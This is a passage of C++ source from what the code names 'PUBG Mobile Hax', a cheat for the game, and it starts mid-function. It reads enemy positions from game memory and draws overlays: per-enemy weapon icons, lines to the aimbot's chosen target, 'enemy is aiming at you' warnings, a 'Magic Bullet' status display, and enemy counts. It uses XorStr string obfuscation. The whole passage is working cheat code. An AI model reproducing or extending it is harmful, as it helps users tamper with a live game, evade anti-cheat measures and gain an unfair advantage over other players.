														DX11::ImGui_DX11::DrawImage(DX11::Hand6, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "M16A4")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand3, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "74 ﻲﻛ ﻡﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand10, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "ﻲﺳ 63 ﻲﺟ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand29, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "ﺩﺯ ﻲﺑ ﻮﻴﻛ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand8, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "ﺍﺯﻭﺮﺟ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand5, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "82 ﻲﺑ ﻱﺩ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand9, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "ﻲﺳ ﻲﻛ ﻲﺑ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand25, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "3 ﻲﺟ ﻡﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand43, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "09 ﻲﺑ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand54, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "ﻲﺑ ﻡﺍ ﻮﻳ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand18, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "91 ﻲﺑ ﻲﺑ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand30, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "ﻱﺯﻭﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand31, Screen.X - 30, Screen.Y - 55, 35, 20);
														continue;
													}
													else if (wep == "ﻦﺟ ﻲﻣﻮﺗ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand34, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "ﺭﻮﺘﻜﻴﻓ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand35, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "ﻲﻛ 5 ﻲﺑ ﻡﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand51, Screen.X - 30, Screen.Y - 55, 50, 20);
														continue;
													}
													else if (wep == "ﻑﻭﺍ ﺩﺍﻮﺳ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand36, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "7981 ﺱﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand12, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "686 ﺱﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand16, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "4101 ﻡﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand56, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "ﻲﻛ 21 ﺱﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand11, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "21 ﻲﺑ ﻱﺩ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand38, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "ﺔﻠﺒﻨﻗ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand19, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "ﻙﻮﻤﺳ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand20, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "ﻑﻮﺗﻮﻟﻮﻣ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand21, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "ﻮﺒﺳﻭﺮﻛ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand37, Screen.X - 30, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == "ﺭﺍ ﻡﺍ ﻱﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand35, Screen.X - 30, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == "Dagger")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand58, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "Zombie Blade")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand59, Screen.X - 30, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == "Zombie Hammer")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand60, Screen.X - 30, Screen.Y - 55, 80, 20);
														continue;
													}
												}
											}
										}

									}
									if (Setting::MAgicline)
									{
										currIndex = Memory::AimFindBestTarget();
										if (MAgiclinee == 0)
										{

											if (AActor.Address == Setting::CurrentTargetAddress)
											{

												DX11::ImGui_DX11::DrawLine(DX11Window::Width / 2, DX11Window::Height, Screen.X + 5, (Screen.Y + 15 + Screen.Z) - 10, Colors::magicline, 0.5f);

											}
										}
										else if (MAgiclinee == 1)
										{


											if (AActor.Address == Setting::CurrentTargetAddress)
											{
												if (Setting::curraim == 0)
												{
													DX11::ImGui_DX11::DrawLine(DX11Window::Width / 2, DX11Window::Height / 2, Head.X, Head.Y, Colors::magicline, 0.7f);
												}
												else if (Setting::curraim == 1)
												{
													DX11::ImGui_DX11::DrawLine(DX11Window::Width / 2, DX11Window::Height / 2, Chest.X, Chest.Y, Colors::magicline, 0.7f);
												}
												else if (Setting::curraim == 2)
												{
													DX11::ImGui_DX11::DrawLine(DX11Window::Width / 2, DX11Window::Height / 2, Pelvis.X, Pelvis.Y, Colors::magicline, 0.7f);
												}
												else if (Setting::curraim == 3)
												{
													DX11::ImGui_DX11::DrawLine(DX11Window::Width / 2, DX11Window::Height / 2, Pelvis.X, Pelvis.Y, Colors::magicline, 0.7f);
												}
											}

										}

									}
								}
							}
						}
					}
					if (Setting::IsimingAtYou)
					{

						if (!Data::AimingAtMePlayersList.empty()) {

							ImColor warncolor;
							int randomNum = (rand() % 2) + 1;
							if (randomNum == 1)
							{
								warncolor = DX11::ImGui_DX11::Color::Red;
							}
							if (randomNum == 2)
							{
								warncolor = DX11::ImGui_DX11::Color::Yellow;
							}
							const char* LOOK = (XorStr(" %d LOOK OUT  %d ").c_str(), ICON_FA_EXCLAMATION_TRIANGLE);

							if (Setting::Lang == 0 || Setting::Lang == 2)
							{
								//Text = "!! " + temp + " Is Aiming At You - " + weapon + " !!";
								Text = "!! ENEMY IS AIMING AT YOU !!";
							}
							else if (Setting::Lang == 1)
							{
								Text = u8"!! ﻚﻴﻟﺍ ﺮﻈﻨﻳ ﻭﺪﻋ ﺪﺟﻮﻳ !!";
							}
							DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, (DX11Window::Width / 2) - 10, (DX11Window::Height / 7), warncolor, Text.c_str(), 25, true);//all done i will go
							//if (Screen.X > DX11Window::Width && Screen.Y > 0 && Screen.Y < DX11Window::Height)//Right
							//{
							//	LOOK = (XorStr("LOOK RIGHT %d").c_str(), ICON_FA_LONG_ARROW_RIGHT);
							//}
							//else if (Screen.X < 0 && Screen.Y  >0 && Screen.Y < DX11Window::Height)//Left
							//{
							//	LOOK = (XorStr(" %d LOOK LEFT").c_str(), ICON_FA_LONG_ARROW_LEFT);
							//}
							//else if (Screen.Y < 0 && Screen.X>0 && Screen.X < DX11Window::Width)//Top
							//{
							//	LOOK = (XorStr(" %d LOOK UP  %d ").c_str(), ICON_FA_LONG_ARROW_UP);
							//}
							//else if (Screen.Y > DX11Window::Height && Screen.X > 0 && Screen.X < DX11Window::Width)//Bottom
							//{
							//	LOOK = (XorStr(" %d LOOK BEHIND  %d ").c_str(), ICON_FA_LONG_ARROW_DOWN);
							//}
							//else if (Screen.X < 0 && Screen.Y < 0)//top left
							//{
							//	LOOK = (XorStr("\xef\x85\xb7  LOOK TOP LEFT   \xef\x85\xb6 ").c_str());
							//}
							//else if (Screen.X > DX11Window::Width && Screen.Y > DX11Window::Height)//bottom right
							//{
							//	LOOK = (XorStr(" \xef\x85\xb5 LOOK BEHIND RIGHT  \xef\x85\xb8 ").c_str());
							//}
							//else if (Screen.X > DX11Window::Width && Screen.Y < 0)//top right
							//{
							//	LOOK = (XorStr("\xef\x85\xb6  LOOK TOP RIGHT  \xef\x85\xb8 ").c_str());
							//}
							//else if (Screen.X<0 && Screen.Y >DX11Window::Width)//bottom left
							//{
							//	LOOK = (XorStr("\xef\x85\xb7  LOOK BEHIND LEFT  \xef\x85\xb5 ").c_str());
							//}
							//DX11::ImGui_DX11::DrawStringchar(DX11::ImGui_DX11::special, 20, LOOK, (DX11Window::Width / 2) - 180, (DX11Window::Height / 2), warncolor, 0);


							for (AActor Aming : Data::AimingAtMePlayersList) {
								Aming.Position = Utility::ReadMemoryEx<VECTOR3>(Utility::ReadMemoryEx<DWORD>(Aming.Address + Offset::RootComponent) + Offset::Position);
								VECTOR3 Screen;
								if (!Algorithm::WorldToScreenPlayer(Data::lOCALPLAYERPosotion, Aming.Position, Screen, &Distance, ViewMatrix)) continue;
								if (Aming.isAimingAtMe)
								{
									string SIMI = "";

									if (Setting::Lang == 0 || Setting::Lang == 2)
									{
										SIMI = "Aiming";

									}
									else if (Setting::Lang == 1)
									{
										SIMI = u8"ﻚﻴﻟﺍ ﺮﻈﻨﻳ";
									}
									DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, 13, SIMI, Screen.X, (Screen.Y + Screen.Z) + 35, DX11::ImGui_DX11::Color::Red, true);


								}
							}
						}

					}
					if (Setting::MyLineOfSight)
					{
						CameraCacheEntry CameraCache = Data::CameraCache;
						VECTOR3 currentViewLocation = Data::CameraCache.POV.Location;//Data::lOCALPLAYERHEAD;
						VECTOR3 currentViewRotation = FRotatorToVector(Data::CameraCache.POV.Rotation);
						VECTOR3 end = ADDVECTORS(currentViewLocation, MULTIPLYVECT(currentViewRotation, Setting::enemyLineofSightSize));

						VECTOR3 screen_start, screen_end;
						int dis;
						if (Algorithm::WorldToScreen(Data::lOCALPLAYERPosotion, currentViewLocation, screen_start, &dis, ViewMatrix) && Algorithm::WorldToScreen(Data::lOCALPLAYERPosotion, end, screen_end, &dis, ViewMatrix)) {
							DX11::ImGui_DX11::DrawLine(screen_start.X, screen_start.Y, screen_end.X, screen_end.Y, Colors::enemyLineofSight, 0.001);
							DX11::ImGui_DX11::DrawCircle(screen_end.X, screen_end.Y, 1.f, linescolors, 1.0f);

						}

					}
					if (Setting::MagicBulletticked)
					{
						if (Setting::aimbotposition)
						{
							if (Data::AActorList.size() != 0)
							{
								Setting::MagicBullet = true;
								//std::string PLAYERS = "";
								//ImGui::PushStyleColor(ImGuiCol_WindowBg, to_vec4(0, 0, 0, 130));
								////ImGui::PushStyleColor(ImGuiCol_Border, to_vec4(45, 225, 0, 180));
								//ImGui::SetNextWindowSize(ImVec2(0, 0));
								//ImGuiStyle& sstyle = ImGui::GetStyle();
								//ImVec4* colors = sstyle.Colors;
								//ImGuiIO& Io = ImGui::GetIO();
								////ImGui::SetNextWindowPos({ 790, (DX11Window::Height / 2.0f) + 300 });
								//ImGui::SetNextWindowPos(ImVec2(Io.DisplaySize.x * 0.5f, Io.DisplaySize.y * 0.9f), ImGuiCond_FirstUseEver, ImVec2(0.5f, 0.9f));
								//
								//
								//if (ImGui::Begin("ebebebebeb", 0, Flags221))
								//{
								//	ImGui::PushStyleColor(ImGuiCol_Text, IM_COL32(37, 255, 0, 255));
								//	//if (Setting::BulletTrackingRange)
								//	//{
								//	//	if (!Setting::Legitrack)
								//	//	{
								//	//		if (Setting::curraim == 0)
								//	//		{
								//	//			std::string PLAYERS = "   Target Pos [ HEAD (" + to_string(Setting::magicrange) + "m) ]   ";
								//	//			ImGui::Text(PLAYERS.c_str());
								//	//		}
								//	//		else if (Setting::curraim == 1)
								//	//		{
								//	//			std::string PLAYERS = "   Target Pos [ BODY (" + to_string(Setting::magicrange) + "m) ]   ";
								//	//			ImGui::Text(PLAYERS.c_str());
								//	//		}
								//	//		else if (Setting::curraim == 2)
								//	//		{
								//	//			std::string PLAYERS = "   Target Pos [ PELVIS (" + to_string(Setting::magicrange) + "m) ]   ";
								//	//			ImGui::Text(PLAYERS.c_str());
								//	//		}
								//	//		else if (Setting::curraim == 3)
								//	//		{
								//	//			std::string PLAYERS = "   Target Pos [ CROSSHAIR (" + to_string(Setting::magicrange) + "m) ]   ";
								//	//			ImGui::Text(PLAYERS.c_str());
								//	//		}
								//	//	}
								//	//	else
								//	//	{
								//	//		std::string PLAYERS = "   Target Pos [ RANDOM (" + to_string(Setting::magicrange) + "m) ]   ";
								//	//		ImGui::Text(PLAYERS.c_str());
								//	//	}
								//	//}
								//	//else
								//	//{
								//	if (!Setting::Legitrack)
								//	{
								//		if (Setting::curraim == 0)
								//		{
								//			std::string PLAYERS = "   Target Pos [ HEAD ]   ";
								//			ImGui::Text(PLAYERS.c_str());
								//		}
								//		else if (Setting::curraim == 1)
								//		{
								//			std::string PLAYERS = "   Target Pos [ BODY ]   ";
								//			ImGui::Text(PLAYERS.c_str());
								//		}
								//		else if (Setting::curraim == 2)
								//		{
								//			std::string PLAYERS = "   Target Pos [ PELVIS ]   ";
								//			ImGui::Text(PLAYERS.c_str());
								//		}
								//		else if (Setting::curraim == 3)
								//		{
								//			std::string PLAYERS = "   Target Pos [ CROSSHAIR ]   ";
								//			ImGui::Text(PLAYERS.c_str());
								//		}
								//	}
								//	else
								//	{
								//		std::string PLAYERS = "   Target Pos [ RANDOM ]   ";
								//
								//		ImGui::Text(PLAYERS.c_str());
								//
								//	}
								//	//}
								//
								//	ImGui::PopStyleColor();
								//
								//	ImGui::End();
								//}
								//
								//ImGui::PopStyleColor();
								//ImGui::PopStyleColor();
								Text = "Magic Bullet Activated !";
								DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 17, Text, 80, DX11Window::Height / 2 - 260, DX11::ImGui_DX11::Color::Green, true);
								string Text1111 = "--->";
								DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 17, Text1111, 260, DX11Window::Height / 2 - 260, DX11::ImGui_DX11::Color::White, true);
								if (!Setting::AutoAim)
								{
									if (Setting::curraim == 0)
									{
										string Text11111 = "Head";
										DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 17, Text11111, 290, DX11Window::Height / 2 - 260, DX11::ImGui_DX11::Color::Red, true);

									}
									else if (Setting::curraim == 1)
									{
										string Text11111 = "Body";
										DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 17, Text11111, 290, DX11Window::Height / 2 - 260, DX11::ImGui_DX11::Color::Red, true);

									}
									else if (Setting::curraim == 2)
									{
										string Text11111 = "Foot";
										DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 17, Text11111, 290, DX11Window::Height / 2 - 260, DX11::ImGui_DX11::Color::Red, true);

									}
								}
								if (Setting::AutoAim)
								{
									string Text11111 = "Auto";
									DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 17, Text11111, 290, DX11Window::Height / 2 - 260, DX11::ImGui_DX11::Color::Red, true);

								}
							}
							else
							{
								Setting::MagicBullet = false;
								//ImGui::PushStyleColor(ImGuiCol_WindowBg, to_vec4(0, 0, 0, 130));
								////ImGui::PushStyleColor(ImGuiCol_Border, to_vec4(255, 0, 0, 180));
								//ImGui::SetNextWindowSize(ImVec2(0, 0));
								//ImGuiStyle& sstyle = ImGui::GetStyle();
								//ImVec4* colors = sstyle.Colors;
								//ImGuiIO& Io = ImGui::GetIO();
								//ImGui::SetNextWindowPos(ImVec2(Io.DisplaySize.x * 0.5f, Io.DisplaySize.y * 0.9f), ImGuiCond_FirstUseEver, ImVec2(0.5f, 0.9f));
								//if (ImGui::Begin("ebebebebeb", 0, Flags221))
								//{
								//	ImGui::PushStyleColor(ImGuiCol_Text, IM_COL32(255, 0, 0, 255));
								//
								//	ImGui::Text("Magic Bullet Closed");
								//	ImGui::PopStyleColor();
								//	ImGui::End();
								//}
								//ImGui::PopStyleColor();
								//ImGui::PopStyleColor();
								Text = "Magic Bullet Activated !";
								DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 17, Text, 80, DX11Window::Height / 2 - 260, DX11::ImGui_DX11::Color::Green, true);
								string Text1111 = "--->";
								DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 17, Text1111, 260, DX11Window::Height / 2 - 260, DX11::ImGui_DX11::Color::White, true);
								if (!Setting::AutoAim)
								{
									if (Setting::curraim == 0)
									{
										string Text11111 = "Head";
										DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 17, Text11111, 290, DX11Window::Height / 2 - 260, DX11::ImGui_DX11::Color::Red, true);

									}
									else if (Setting::curraim == 1)
									{
										string Text11111 = "Body";
										DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 17, Text11111, 290, DX11Window::Height / 2 - 260, DX11::ImGui_DX11::Color::Red, true);

									}
									else if (Setting::curraim == 2)
									{
										string Text11111 = "Foot";
										DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 17, Text11111, 290, DX11Window::Height / 2 - 260, DX11::ImGui_DX11::Color::Red, true);

									}
								}
								if (Setting::AutoAim)
								{
									string Text11111 = "Auto";
									DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 17, Text11111, 290, DX11Window::Height / 2 - 260, DX11::ImGui_DX11::Color::Red, true);

								}
							}
						}
					}
					else
					{
						Text = "Magic Bullet Not Activated !";
						DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 17, Text, 80, DX11Window::Height / 2 - 260, DX11::ImGui_DX11::Color::Red, true);
					}
					int botcount;
					int playercount;
					static int blabla = 0;

					if (Setting::TotalEnemy)
					{
						if (Setting::Lang == 0 || Setting::Lang == 2)
						{
							if (TotalEnemyStyle == 0)
							{
								if (Data::NetDriver > 0)
								{
									g_Discord->Update();

									if (Data::AActorList.size() != 0)
									{

										botcount = 0;
										playercount = 0;
										for (int i = 0; i < Data::AActorList.size(); i++)
										{
											if (Data::AActorList[i].Name == " Bot ")
											{
												botcount = botcount + 1;
											}
											else
											{
												playercount = playercount + 1;
											}
										}
										ImGui::PushStyleColor(ImGuiCol_WindowBg, to_vec4(0, 0, 0, 140));
										ImGui::PushStyleColor(ImGuiCol_Border, to_vec4(255, 255, 255, 255));
										ImGui::PushStyleVar(ImGuiStyleVar_WindowBorderSize, 1.5f);
										ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 15.f);
										ImGui::SetNextWindowSize(ImVec2(0, 0));
										ImGuiStyle& sstyle = ImGui::GetStyle();
										ImVec4* colors = sstyle.Colors;
										ImGuiIO& Io = ImGui::GetIO();
										ImGui::SetNextWindowPos(ImVec2(Io.DisplaySize.x * 0.5f, Io.DisplaySize.y * 0.1f), ImGuiCond_FirstUseEver, ImVec2(0.5f, 0.1f));
										if (ImGui::Begin("ene", 0, Flags221))
										{
											///*std::string total = " ENEMYS ARROUND: ";
											//*/total.append(std::to_string((Data::AActorList.size())));

											std::string player = "             Player: " + std::to_string(playercount) + "  " + "Bots: " + std::to_string(botcount) + "             ";
											//player.append(std::to_string(playercount));
											//std::string bot = "Bots ";
											//bot.append(std::to_string(botcount));

											//ImGui::PushStyleColor(ImGuiCol_Text, IM_COL32(255, 255, 255, 255));
											//ImGui::Text(total.c_str());
											//ImGui::PopStyleColor();
											//ImGui::SameLine();

											//ImGui::PushStyleColor(ImGuiCol_Text, to_vec4(255,255,255,255));
											//
											ImGui::Text(player.c_str());
											//ImGui::PopStyleColor();
											//ImGui::SameLine();
											//
											//ImGui::PushStyleColor(ImGuiCol_Text, IM_COL32(255, 255, 255, 255));
											//ImGui::Text(bot.c_str());
											//ImGui::PopStyleColor();
											//ImGui::SameLine();
											ImGui::End();

										}

										ImGui::PopStyleColor();
										ImGui::PopStyleColor();
										ImGui::PopStyleVar();
										ImGui::PopStyleVar();

									}
									else
									{

										g_Discord->Update();
										ImGui::PushStyleColor(ImGuiCol_WindowBg, to_vec4(0, 0, 0, 108));
										ImGui::PushStyleColor(ImGuiCol_Border, to_vec4(255, 255, 255, 255));

										ImGui::PushStyleVar(ImGuiStyleVar_WindowBorderSize, 1.5f);
										ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 15.f);


										ImGuiIO& Io = ImGui::GetIO();

										ImGui::SetNextWindowPos(ImVec2(Io.DisplaySize.x * 0.5f, Io.DisplaySize.y * 0.1f), ImGuiCond_FirstUseEver, ImVec2(0.5f, 0.1f));

										if (ImGui::Begin("ene", 0, Flags221))
										{

											std::string playerA = "No One Is Near You";


											ImGui::Text(playerA.c_str());
											ImGui::End();
										}
										ImGui::PopStyleColor();
										ImGui::PopStyleColor();
										ImGui::PopStyleVar();
										ImGui::PopStyleVar();
									}
								}
								else
								{
									g_Discord->Update();

									ImGui::PushStyleColor(ImGuiCol_WindowBg, to_vec4(0, 0, 0, 108));

									ImGui::PushStyleColor(ImGuiCol_Border, to_vec4(255, 255,255, 255));
									ImGui::PushStyleVar(ImGuiStyleVar_WindowBorderSize, 1.5f);
									ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 15.f);


									ImGuiIO& Io = ImGui::GetIO();

									ImGui::SetNextWindowPos(ImVec2(Io.DisplaySize.x * 0.5f, Io.DisplaySize.y * 0.1f), ImGuiCond_FirstUseEver, ImVec2(0.5f, 0.1f));

									if (ImGui::Begin("ene", 0, Flags221))
									{
										int minutes = Data::TimeRemind / 60;
										int hours = minutes / 60;
										std::string playerA = " Welcome To PUBG Mobile Hax ";

										ImGui::PushStyleColor(ImGuiCol_Text, IM_COL32(255, 255, 255, 255));
										ImGui::Text(playerA.c_str());
										ImGui::PopStyleColor();
										//ImGui::SameLine();

										//ImGui::PushStyleColor(ImGuiCol_Text, IM_COL32(255, 255, 255, 255));
										//ImGui::Text(botA.c_str());
										//ImGui::PopStyleColor();
										//ImGui::SameLine();

										//ImGui::PushStyleColor(ImGuiCol_Text, IM_COL32(0, 214, 255, 255));
										//ImGui::Text(LobbyTime.c_str());
										//ImGui::PopStyleColor();
										ImGui::End();
									}
									ImGui::PopStyleColor();
									ImGui::PopStyleColor();
									ImGui::PopStyleVar();
									ImGui::PopStyleVar();

								}
							}
							else if (TotalEnemyStyle == 1)
							{
								DrawTotalEnemies();
							}
							if (TotalEnemyStyle == 2)
							{
								if (Data::NetDriver > 0)
								{
									g_Discord->Update();

									if (Data::AActorList.size() != 0)
									{

										botcount = 0;
										playercount = 0;
										for (int i = 0; i < Data::AActorList.size(); i++)
										{
											if (Data::AActorList[i].Name == " Bot ")
											{
												botcount = botcount + 1;
											}
											else
											{
												playercount = playercount + 1;
											}
										}
										ImGui::PushStyleColor(ImGuiCol_WindowBg, to_vec4(255, 0, 0, 80));
										ImGui::PushStyleColor(ImGuiCol_Border, BorderColor);
										ImGui::SetNextWindowSize(ImVec2(0, 0));
										ImGuiStyle& sstyle = ImGui::GetStyle();
										ImVec4* colors = sstyle.Colors;
										ImGuiIO& Io = ImGui::GetIO();
										ImGui::SetNextWindowPos(ImVec2(Io.DisplaySize.x * 0.5f, Io.DisplaySize.y * 0.1f), ImGuiCond_FirstUseEver, ImVec2(0.5f, 0.1f));
										if (ImGui::Begin("ene", 0, Flags221))
										{
											std::string player = " Players: " + std::to_string(playercount) + " - " + "Bots: " + std::to_string(botcount);


											ImGui::Text(player.c_str());

											ImGui::End();

										}

										ImGui::PopStyleColor();
										ImGui::PopStyleColor();

									}
									else
									{

										g_Discord->Update();
										ImGui::PushStyleColor(ImGuiCol_WindowBg, to_vec4(0, 255, 0, 100));
										ImGui::PushStyleColor(ImGuiCol_Border, BorderColor);
										ImGuiIO& Io = ImGui::GetIO();

										ImGui::SetNextWindowPos(ImVec2(Io.DisplaySize.x * 0.5f, Io.DisplaySize.y * 0.1f), ImGuiCond_FirstUseEver, ImVec2(0.5f, 0.1f));

										if (ImGui::Begin("ene", 0, Flags221))
										{

											std::string playerA = " Clear ";

											ImGui::PushStyleColor(ImGuiCol_Text, to_vec4(255, 255, 255, 255));

											ImGui::Text(playerA.c_str());
											ImGui::PopStyleColor();
											ImGui::SameLine();
											ImGui::End();
										}
										ImGui::PopStyleColor();
										ImGui::PopStyleColor();

									}
								}
								else
								{
									g_Discord->Update();

									ImGui::PushStyleColor(ImGuiCol_WindowBg, to_vec4(255, 0, 0, 100));
									ImGui::PushStyleColor(ImGuiCol_Border, BorderColor);
									ImGuiIO& Io = ImGui::GetIO();

									ImGui::SetNextWindowPos(ImVec2(Io.DisplaySize.x * 0.5f, Io.DisplaySize.y * 0.1f), ImGuiCond_FirstUseEver, ImVec2(0.5f, 0.1f));

									if (ImGui::Begin("ene", 0, Flags221))
									{
										int minutes = Data::TimeRemind / 60;
										int hours = minutes / 60;
										std::string playerA = " Welcome To PUBG Mobile Hax ";

										ImGui::PushStyleColor(ImGuiCol_Text, IM_COL32(255, 255, 255, 255));
										ImGui::Text(playerA.c_str());
										ImGui::PopStyleColor();
										//ImGui::SameLine();

										//ImGui::PushStyleColor(ImGuiCol_Text, IM_COL32(255, 255, 255, 255));
										//ImGui::Text(botA.c_str());
										//ImGui::PopStyleColor();
										//ImGui::SameLine();

										//ImGui::PushStyleColor(ImGuiCol_Text, IM_COL32(0, 214, 255, 255));
										//ImGui::Text(LobbyTime.c_str());
										//ImGui::PopStyleColor();
										ImGui::End();
									}
									ImGui::PopStyleColor();
									ImGui::PopStyleColor();

								}
							}
							if (TotalEnemyStyle == 3)
							{
								if (Data::NetDriver > 0)
								{
									g_Discord->Update();

									if (Data::AActorList.size() != 0)
									{

										botcount = 0;
										playercount = 0;
										for (int i = 0; i < Data::AActorList.size(); i++)
										{
											if (Data::AActorList[i].Name == " Bot ")
											{
												botcount = botcount + 1;
											}
											else
											{
												playercount = playercount + 1;
											}
										}
										ImGui::PushStyleColor(ImGuiCol_WindowBg, to_vec4(0, 0, 0, 130));
										ImGui::PushStyleColor(ImGuiCol_Border, to_vec4(0, 255, 0, 255));
										ImGui::SetNextWindowSize(ImVec2(0, 0));
										ImGuiStyle& sstyle = ImGui::GetStyle();
										ImVec4* colors = sstyle.Colors;
										ImGuiIO& Io = ImGui::GetIO();
										ImGui::SetNextWindowPos(ImVec2(Io.DisplaySize.x * 0.5f, Io.DisplaySize.y * 0.1f), ImGuiCond_FirstUseEver, ImVec2(0.5f, 0.1f));
										if (ImGui::Begin("ene", 0, Flags221))
										{
											std::string player = " Total enemy arround you: ";
											player.append(to_string(Data::AActorList.size()) + " ");

											ImGui::PushStyleColor(ImGuiCol_Text, to_vec4(255, 255, 255, 255));

											ImGui::Text(player.c_str());
											ImGui::PopStyleColor();
											ImGui::SameLine();
											ImGui::End();

										}

										ImGui::PopStyleColor();
										ImGui::PopStyleColor();

									}
								}
								else
								{
									g_Discord->Update();

									ImGui::PushStyleColor(ImGuiCol_WindowBg, to_vec4(0, 0, 0, 130));
									ImGui::PushStyleColor(ImGuiCol_Border, to_vec4(0, 255, 0, 255));
									ImGuiIO& Io = ImGui::GetIO();

									ImGui::SetNextWindowPos(ImVec2(Io.DisplaySize.x * 0.5f, Io.DisplaySize.y * 0.1f), ImGuiCond_FirstUseEver, ImVec2(0.5f, 0.1f));

									if (ImGui::Begin("ene", 0, Flags221))
									{
										int minutes = Data::TimeRemind / 60;
										int hours = minutes / 60;
										std::string playerA = " Welcome To PUBG Mobile Hax ";

										ImGui::PushStyleColor(ImGuiCol_Text, IM_COL32(255, 255, 255, 255));
										ImGui::Text(playerA.c_str());
										ImGui::PopStyleColor();
										//ImGui::SameLine();

										//ImGui::PushStyleColor(ImGuiCol_Text, IM_COL32(255, 255, 255, 255));
										//ImGui::Text(botA.c_str());
										//ImGui::PopStyleColor();
										//ImGui::SameLine();

										//ImGui::PushStyleColor(ImGuiCol_Text, IM_COL32(0, 214, 255, 255));
										//ImGui::Text(LobbyTime.c_str());
										//ImGui::PopStyleColor();
										ImGui::End();
									}
									ImGui::PopStyleColor();
									ImGui::PopStyleColor();

								}
							}

						}
						else if (Setting::Lang == 1)
						{
							if (TotalEnemyStyle == 0)
							{
								if (Data::NetDriver > 0)
								{
									g_Discord->Update();

									if (Data::AActorList.size() != 0)
									{

										botcount = 0;
										playercount = 0;
										for (int i = 0; i < Data::AActorList.size(); i++)
										{
											if (Data::AActorList[i].Name == " Bot ")
											{
												botcount = botcount + 1;
											}
											else
											{
												playercount = playercount + 1;
											}
										}
										ImGui::PushStyleColor(ImGuiCol_WindowBg, to_vec4(0, 0, 0, 120));
										ImGui::PushStyleColor(ImGuiCol_Border, to_vec4(204, 204, 204, 255));
